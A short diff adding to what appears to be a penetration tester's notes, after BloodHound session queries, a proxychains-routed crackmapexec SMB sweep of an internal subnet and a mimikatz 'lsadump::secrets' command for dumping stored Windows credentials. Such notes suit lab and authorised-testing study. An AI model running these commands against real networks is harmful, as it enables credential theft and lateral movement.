@@ -3463,3 +3463,9 @@ MATCH (m:User) RETURN m
 MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
 ```
 
+can use crackmapexec for open smb shares
+```
+sudo proxychains -q crackmapexec smb 172.16.211.0/24
+```
+mimikatz
+lsadump::secrets 
